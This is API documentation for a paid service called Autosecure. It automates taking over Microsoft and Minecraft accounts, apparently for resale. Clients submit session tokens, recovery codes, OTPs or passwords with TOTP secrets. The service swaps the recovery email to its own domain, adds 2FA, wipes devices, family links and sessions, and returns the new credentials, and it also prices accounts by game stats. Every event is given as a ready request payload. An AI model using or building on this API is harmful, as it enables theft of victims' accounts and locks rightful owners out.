# Autosecure API Documentation

Welcome to the Autosecure API docs!

## Connection

**WebSocket URL:** `wss://autosecure.lol/api/`  
**Protocol:** Native WebSocket  
**Authentication:** API Key required  

## Getting Started

### 1. Obtain an API Key

Contact dona to purchase an API key. Each API key has specific permissions and rate limits.

### 2. Connect to the WebSocket

Connect to `wss://autosecure.lol/api/` using any WebSocket client library in your preferred programming language.

### 3. Authenticate

Immediately after connecting, send an authentication message with your API key.

## Message Format

All messages are JSON objects. Request IDs are automatically generated by the server if not provided.

**Request:**
```json
{
    "type": "event",
    "event": "event_name",
    "data": {
        // Event-specific parameters
    }
}
```

## Response Pattern

**All events use a dual-response pattern for better user experience:**

1. **Immediate Acknowledgment** - Sent within milliseconds to confirm request receipt:
```json
{
    "type": "acknowledgement",
    "event": "event_name",
    "id": "auto_generated_request_id",
    "success": true,
    "message": "Request received"
}
```

2. **Final Response** - Sent after processing completes with actual results:
```json
{
    "type": "event_response",
    "event": "event_name",
    "id": "auto_generated_request_id",
    "success": true,
    "data": {
        // Response data
    }
}
```

Both responses share the same request ID so you can match them to your original request.


## Authentication

### Authentication Message

Send this message immediately after connecting:

```json
{
    "type": "auth",
    "data": {
        "api_key": "your_api_key_here"
    }
}
```

**Response:**
```json
{
    "type": "auth_response",
    "id": "auto_generated_id",
    "success": true,
    "message": "Authentication successful",
    "allowed_events": ["msaauth", "status", "recoverycode", "otp", "emails", "lunar", "seckey", "stats"]
}
```

## API Events

## Optional Parameters for Secure Events

The following optional parameters apply to all account securing events (`msaauth`, `recoverycode`, `otp`, `seckey`):

- `primary_amount` (Integer, default: 1): Email changes (0=keep, 1=change once, 2=change twice)
- `primary_prefix` (String, default: "dona"): Prefix for new primary email
- `tfa` (Boolean, default: false): Enable 2FA
- `change_ign` (Boolean, default: false): Change in-game name
- `change_name` (Boolean, default: false): Change account name
- `change_dob` (Boolean, default: false): Change date of birth
- `change_pfp` (Boolean, default: false): Change profile picture
- `multiplayer` (Boolean, default: false): Disable multiplayer
- `secureifnomc` (Boolean, default: false): Secure even without Minecraft
- `domain` (String, default: "autosecure.lol"): Email domain
- `pfp_url` (String): Profile picture URL
- `devices` (Boolean, default: true): Remove devices
- `family` (Boolean, default: true): Remove from Microsoft Family
- `sign_out` (Boolean, default: true): Sign out all sessions
- `windows_hello_keys` (Boolean, default: true): Remove Windows Hello keys
- `oauth_apps` (Boolean, default: true): Remove OAuth apps
- `username` (String): Custom username

### 1. Secure Account with MSAAUTH

**Event:** `msaauth`

Secures a Microsoft account using an MSAAUTH token.

**Required Parameters:**
- `uid` (String): Unique 10-character alphanumeric identifier
- `msaauth` (String): The MSAAUTH token
- `user_id` (String): User ID for the request

**Optional Parameters:** See [Optional Parameters for Secure Events](#optional-parameters-for-secure-events)

**Request:**
```json
{
    "type": "event",
    "event": "msaauth",
    "data": {
        "uid": "A1B2C3D4E5",
        "msaauth": "your_msaauth_token",
        "user_id": "user123",
        "tfa": true,
        "change_ign": true
    }
}
```

**Success Response:**
```json
{
    "type": "event_response",
    "event": "msaauth",
    "id": "req_1641024000000_abc123",
    "success": true,
    "message": "Account secured successfully.",
    "uid": "A1B2C3D4E5",
    "status": "Secured Successfully",
    "raw": {
        // Account details
    }
}
```

### 2. Secure Account with Recovery Code

**Event:** `recoverycode`

Secures a Microsoft account using a recovery code.

**Required Parameters:**
- `uid` (String): Unique identifier
- `email` (String): Primary email address
- `recovery_code` (String): Account recovery code
- `user_id` (String): User ID

**Optional Parameters:** See [Optional Parameters for Secure Events](#optional-parameters-for-secure-events)

**Request:**
```json
{
    "type": "event",
    "event": "recoverycode",
    "data": {
        "uid": "A1B2C3D4E5",
        "email": "user@example.com",
        "recovery_code": "recovery_code_here",
        "user_id": "user123"
    }
}
```

**Success Response:**
```json
{
    "type": "event_response",
    "event": "recoverycode",
    "id": "req_1641024000000_abc123",
    "success": true,
    "message": "Account secured successfully with recovery code.",
    "uid": "A1B2C3D4E5",
    "status": "Secured Successfully",
    "raw": {
        // Account details
    }
}
```

### 3. Secure Account with OTP

**Event:** `otp`

Secures a Microsoft account using One-Time Password.

**Required Parameters:**
- `uid` (String): Unique identifier
- `email` (String): Primary email address
- `sec_id` (String): Secure ID for OTP
- `otp_code` (String): 6-digit OTP code
- `user_id` (String): User ID

**Optional Parameters:** See [Optional Parameters for Secure Events](#optional-parameters-for-secure-events)

**Request:**
```json
{
    "type": "event",
    "event": "otp",
    "data": {
        "uid": "A1B2C3D4E5",
        "email": "user@example.com",
        "sec_id": "secure_id",
        "otp_code": "123456",
        "user_id": "user123"
    }
}
```

**Success Response:**
```json
{
    "type": "event_response",
    "event": "otp",
    "id": "req_1641024000000_abc123",
    "success": true,
    "message": "Account secured successfully with OTP.",
    "uid": "A1B2C3D4E5",
    "status": "Secured Successfully",
    "raw": {
        // Account details
    }
}
```

### 4. Secure Account with Secret Key

**Event:** `seckey`

Secures a Microsoft account using email, password, and TOTP secret key.

**Required Parameters:**
- `uid` (String): Unique 10-character alphanumeric identifier
- `email` (String): Primary email address
- `password` (String): Account password (minimum 6 characters)
- `totp_secret` (String): TOTP secret key (minimum 16 characters)
- `user_id` (String): User ID for the request

**Optional Parameters:** See [Optional Parameters for Secure Events](#optional-parameters-for-secure-events)

**Request:**
```json
{
    "type": "event",
    "event": "seckey",
    "data": {
        "uid": "A1B2C3D4E5",
        "email": "user@example.com",
        "password": "user_password",
        "totp_secret": "JBSWY3DPEHPK3PXP",
        "user_id": "user123",
        "tfa": true,
        "change_ign": true
    }
}
```

**Success Response:**
```json
{
    "type": "event_response",
    "event": "seckey",
    "id": "req_1641024000000_abc123",
    "success": true,
    "message": "Account secured successfully.",
    "uid": "A1B2C3D4E5",
    "status": "Secured Successfully",
    "raw": {
        // Account details
    }
}
```

### 5. Check Account Status

**Event:** `status`

Retrieves the status of a security operation.

**Required Parameters:**
- `uid` (String): The unique identifier

**Request:**
```json
{
    "type": "event",
    "event": "status",
    "data": {
        "uid": "A1B2C3D4E5"
    }
}
```

**Response:**
```json
{
    "type": "event_response",
    "event": "status",
    "id": "req_1641024000000_xyz789",
    "success": true,
    "uid": "A1B2C3D4E5",
    "msaauth": "token_value",
    "username": "username_value",
    "recovery_code": "recovery_code",
    "secret_key": "tfa_token",
    "primary_email": "email@example.com",
    "security_email": "security@example.com",
    "password": "password_value",
    "multiplayer": "status",
    "oauth_apps": "status"
}
```

### 6. Retrieve Emails

**Event:** `emails`

Gets emails for a specified address.

**Required Parameters:**
- `email` (String): Email address to check

**Request:**
```json
{
    "type": "event",
    "event": "emails",
    "data": {
        "email": "example@autosecure.lol"
    }
}
```

**Response:**
```json
{
    "type": "event_response",
    "event": "emails",
    "id": "req_1641024000000_def456",
    "success": true,
    "inbox": "example@autosecure.lol",
    "emails": [
        {
            "sender": "sender@example.com",
            "subject": "Email Subject",
            "description": "Email Content",
            "time": "2025-01-01T12:00:00.000Z"
        }
    ],
    "total": 1
}
```

### 7. Lunar Client Attributes

**Event:** `lunar`

Gets Lunar Client cosmetics and emotes.

**Required Parameters:**
- `accessToken` (String): Minecraft SSID

**Request:**
```json
{
    "type": "event",
    "event": "lunar",
    "data": {
        "accessToken": "minecraft_ssid"
    }
}
```

**Response:**
```json
{
    "type": "event_response",
    "event": "lunar",
    "id": "req_1641024000000_mno345",
    "success": true,
    "data": {
        "cosmetics": {
            // Cosmetics data
        },
        "emotes": {
            // Emotes data
        }
    }
}
```

### 8. Player Statistics

**Event:** `stats`

Retrieves comprehensive Hypixel statistics for a player and optional price calculations.

**Required Parameters:**
- `username` (String): Minecraft username to fetch stats for

**Request:**
```json
{
    "type": "event",
    "event": "stats",
    "data": {
        "username": "56ms"
    }
}
```

**Response:**
```json
{
    "type": "event_response",
    "event": "stats",
    "id": "req_1641024000000_stat001",
    "success": true,
    "uuid": "b876ec32e396476ba1158438d9a1a474",
    "profile": "Strawberry",
    "data": {
        "bedwarstars": 1200,
        "rank": "mvp+",
        // ... many more stat keys (all lowercase, no % symbols)
    },
    "price_calcs": {
        // Price-calculations (if available)
    }
}
```

## Connection Management

### Connection Status

Check your connection status anytime:

**Request:**
```json
{
    "type": "status"
}
```

**Response:**
```json
{
    "type": "status_response",
    "id": "req_1641024000000_pqr678",
    "success": true,
    "authenticated": true,
    "api_key": "...",
    "allowed_events": ["msaauth", "status", "recoverycode", "otp", "emails", "lunar", "seckey", "stats"],
    "connection_id": "unique_connection_id"
}
```

## Error Handling

### Common Errors

**Authentication Required:**
```json
{
    "type": "event_response",
    "id": "req_1641024000000_stu901",
    "success": false,
    "message": "Authentication required"
}
```

**Event Not Allowed:**
```json
{
    "type": "event_response",
    "id": "req_1641024000000_vwx234",
    "success": false,
    "message": "Access denied for event: event_name"
}
```

**Rate Limit Exceeded:**
```json
{
    "type": "event_response",
    "id": "req_1641024000000_yza567",
    "success": false,
    "message": "Rate limit exceeded. Please try again later."
}
```

### Account Status Codes

- \`Secured Successfully\` - Account secured successfully; no further action required
- \`Child Landing\` - Child account detected; requires adult consent / cannot be auto-secured
- \`No MC\` - Account does not own Minecraft
- \`Locked\` - Account temporarily locked or suspended by Microsoft
- \`Phone Locked\` - Phone verification is required to unlock the account
- \`Chinese Lock\` - PIPL/China-specific restrictions (Chinese SMS verification required)
- \`Service Down\` - Microsoft authentication services are currently unavailable
- \`MSAAUTH invalid\` - The supplied MSAAUTH token is invalid or expired
- \`Password Flagged\` - The current password is flagged by Microsoft and must be changed manually
- \`Proxy Failed\` - Network / proxy error while talking to Microsoft endpoints
- \`Failed to retrieve login proofs\` - Unable to obtain login proofs during the authentication flow
- \`OTP Fatigue\` - Too many OTP requests; account temporarily rate-limited for OTP codes
- \`Complete recovery process failed after multiple attempts\` - Automated recovery flow could not finish after the configured retries
- \`Error\` - Generic internal error state when an unexpected issue occurs

## Rate Limiting

- Rate limits are set per API key
- Limits are enforced per 5-minute window
- Exceeded limits result in temporary request rejection
- Contact dona to adjust limits

## Request IDs

- Request IDs are automatically generated by the server
- You can optionally provide your own ID in the request
- All responses include the request ID for tracking
- Format: `req_timestamp_randomstring`

## Connection Management

WebSocket connections are persistent and can be used indefinitely for multiple API requests. Once you connect and authenticate, you can send as many requests as needed through the same connection without having to reconnect or re-authenticate.

The connection will remain active unless it's closed due to:
- Network connectivity issues
- Server maintenance or restarts
- Extended periods of inactivity (60+ seconds without ping/pong response)
- The API key becomes **inactive / revoked**
- Client-side disconnection

If the connection is lost due to network issues or other problems, you will need to reconnect and re-authenticate before continuing to use the API.

## Request IDs

Request IDs serve to match responses with their corresponding requests. Since WebSocket connections are asynchronous, you may send multiple requests before receiving responses, and responses may arrive out of order. The auto-generated request ID in each response allows you to correlate which response belongs to which request.

## Implementation Notes

- Use any WebSocket client library in your preferred language
- Messages must be valid JSON
- Connection is persistent - reuse for multiple requests
- Implement reconnection logic to handle network interruptions
- Use request IDs to match responses to your original requests
- Responses may arrive out of order
